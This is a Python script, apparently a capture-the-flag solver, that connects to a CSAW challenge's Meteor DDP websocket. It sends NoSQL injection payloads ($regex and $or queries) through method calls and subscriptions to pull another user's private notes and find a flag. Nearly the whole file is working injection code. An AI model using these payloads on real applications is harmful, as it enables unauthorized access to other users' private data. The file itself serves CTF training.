import json
import websocket
import random
import time

def generate_id():
    return ''.join(random.choices('0123456789abcdef', k=17))

def send_ddp_message(ws, msg):
    ws.send(json.dumps(msg))
    return ws.recv()

def connect_ddp():
    ws = websocket.create_connection('ws://web.chal.csaw.io:5000/websocket')
    connect_msg = {
        "msg": "connect",
        "version": "1",
        "support": ["1"]
    }
    send_ddp_message(ws, connect_msg)
    return ws

def main():
    ws = connect_ddp()

    # First try to get all notes by Terry
    payload1 = {
        "msg": "method",
        "method": "notes.private",
        "params": [{"owner": {"$regex": "terry", "$options": "i"}}],
        "id": generate_id()
    }

    print("\nTrying to get Terry's private notes...")
    print(send_ddp_message(ws, payload1))

    # Try subscription to notes.private
    sub_msg = {
        "msg": "sub",
        "name": "notes.private",
        "params": [{"owner": {"$regex": "terry", "$options": "i"}}],
        "id": generate_id()
    }

    print("\nSubscribing to private notes...")
    print(send_ddp_message(ws, sub_msg))

    # Wait for subscription data
    print("\nWaiting for note data...")
    try:
        for _ in range(5):
            data = ws.recv()
            print(f"Received: {data}")
            time.sleep(1)

            # Try to parse the response for potential flag content
            try:
                json_data = json.loads(data)
                if 'result' in json_data and isinstance(json_data['result'], list):
                    for note in json_data['result']:
                        if isinstance(note, dict) and 'content' in note:
                            if 'flag{' in note['content']:
                                print(f"!!! Found potential flag: {note['content']}")
            except:
                pass
    except Exception as e:
        print(f"Error receiving data: {e}")

    # Try another approach with $or operator
    payload2 = {
        "msg": "method",
        "method": "notes.find",
        "params": [{
            "$or": [
                {"owner": "terry"},
                {"owner": "Terry"},
                {"content": {"$regex": "flag{", "$options": "i"}}
            ]
        }],
        "id": generate_id()
    }

    print("\nTrying alternative approach...")
    print(send_ddp_message(ws, payload2))

    # Final attempt with notes.count method
    payload3 = {
        "msg": "method",
        "method": "notes.count",
        "params": [{
            "$or": [
                {"owner": "terry", "private": True},
                {"owner": "Terry", "private": True}
            ]
        }],
        "id": generate_id()
    }

    print("\nFinal attempt with notes.count...")
    try:
        print(send_ddp_message(ws, payload3))

        # Wait for any additional data
        for _ in range(3):
            data = ws.recv()
            print(f"Final received: {data}")
            time.sleep(1)
    except:
        pass

if __name__ == "__main__":
    main()

